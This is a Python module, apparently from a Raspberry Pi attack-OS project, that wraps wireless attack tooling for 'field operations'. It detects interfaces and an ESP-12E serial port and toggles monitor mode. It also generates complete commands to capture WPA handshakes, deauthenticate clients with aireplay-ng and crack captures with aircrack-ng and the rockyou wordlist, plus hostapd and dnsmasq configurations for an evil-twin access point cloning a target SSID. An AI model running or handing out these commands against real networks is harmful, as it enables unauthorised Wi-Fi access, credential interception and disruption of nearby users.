"""
Phoenix OS — Wireless Attack Stack
WiFi, BLE, and ESP-12E attack modules for field operations
Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import os
import subprocess
import logging
from typing import Optional

logger = logging.getLogger(__name__)


class WirelessStack:
    """
    Manages wireless attack capabilities on Phoenix OS Pi 5 build
    Interfaces with ESP-12E via RP2040 for WiFi attacks
    Uses system tools (aircrack-ng, hostapd) for advanced attacks
    """

    def __init__(self):
        self.interface = self._detect_interface()
        self.esp_port = self._detect_esp()
        logger.info(f"WirelessStack init | iface: {self.interface} | ESP: {self.esp_port}")

    def _detect_interface(self) -> Optional[str]:
        """Auto-detect wireless interface"""
        try:
            result = subprocess.run(
                ["iw", "dev"], capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                if "Interface" in line:
                    return line.strip().split()[-1]
        except Exception:
            pass
        # Fallback common names
        for iface in ["wlan0", "wlan1", "wlp2s0", "wlx000000000000"]:
            if os.path.exists(f"/sys/class/net/{iface}"):
                return iface
        return None

    def _detect_esp(self) -> Optional[str]:
        """Detect ESP-12E serial port"""
        for port in ["/dev/ttyUSB0", "/dev/ttyUSB1", "/dev/ttyAMA0"]:
            if os.path.exists(port):
                return port
        return None

    def scan_networks(self) -> list:
        """Scan for nearby WiFi networks"""
        if not self.interface:
            return []
        try:
            result = subprocess.run(
                ["iwlist", self.interface, "scan"],
                capture_output=True, text=True, timeout=15
            )
            networks = []
            current = {}
            for line in result.stdout.splitlines():
                line = line.strip()
                if "ESSID:" in line:
                    current["ssid"] = line.split('"')[1] if '"' in line else ""
                elif "Address:" in line:
                    current["bssid"] = line.split()[-1]
                elif "Frequency:" in line:
                    current["freq"] = line.split()[1]
                elif "Encryption key:" in line:
                    current["encrypted"] = "on" in line.lower()
                elif "Signal level=" in line:
                    try:
                        current["signal"] = line.split("Signal level=")[1].split()[0]
                    except Exception:
                        pass
                if "ssid" in current and "bssid" in current:
                    networks.append(current.copy())
                    current = {}
            return networks
        except Exception as e:
            logger.error(f"Scan error: {e}")
            return []

    def enable_monitor_mode(self) -> bool:
        """Put wireless interface into monitor mode"""
        if not self.interface:
            return False
        try:
            subprocess.run(["airmon-ng", "start", self.interface],
                         capture_output=True, timeout=10)
            self.interface = f"{self.interface}mon"
            logger.info(f"Monitor mode enabled: {self.interface}")
            return True
        except Exception as e:
            logger.error(f"Monitor mode failed: {e}")
            return False

    def disable_monitor_mode(self) -> bool:
        """Restore managed mode"""
        if not self.interface:
            return False
        try:
            iface = self.interface.replace("mon", "")
            subprocess.run(["airmon-ng", "stop", self.interface],
                         capture_output=True, timeout=10)
            self.interface = iface
            return True
        except Exception as e:
            logger.error(f"Disable monitor failed: {e}")
            return False

    def capture_handshake(self, bssid: str, channel: int,
                          output_file: str = "/tmp/capture") -> dict:
        """Capture WPA handshake for offline cracking"""
        if not self.interface:
            return {"success": False, "error": "No wireless interface"}
        return {
            "command": f"airodump-ng -c {channel} --bssid {bssid} -w {output_file} {self.interface}",
            "deauth_command": f"aireplay-ng --deauth 10 -a {bssid} {self.interface}",
            "crack_command": f"aircrack-ng {output_file}-01.cap -w /usr/share/wordlists/rockyou.txt",
            "note": "Run capture_command first, then deauth to force handshake, then crack",
        }

    def evil_twin_config(self, target_ssid: str, channel: int = 6) -> dict:
        """Generate evil twin AP configuration"""
        return {
            "hostapd_conf": f"""interface={self.interface}
driver=nl80211
ssid={target_ssid}
channel={channel}
hw_mode=g
ignore_broadcast_ssid=0""",
            "dnsmasq_conf": """interface=wlan0
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp""",
            "note": "Educational reference only — always obtain written authorization",
        }

    def esp_send_command(self, command: str) -> Optional[str]:
        """Send AT command to ESP-12E via serial"""
        if not self.esp_port:
            return None
        try:
            import serial
            with serial.Serial(self.esp_port, 115200, timeout=3) as ser:
                ser.write(f"{command}\r\n".encode())
                response = ser.read(1024).decode(errors="ignore")
                return response
        except ImportError:
            return "pyserial not installed — pip3 install pyserial"
        except Exception as e:
            return f"ESP error: {e}"

    def get_status(self) -> dict:
        return {
            "interface": self.interface,
            "esp_port": self.esp_port,
            "monitor_mode": self.interface.endswith("mon") if self.interface else False,
        }
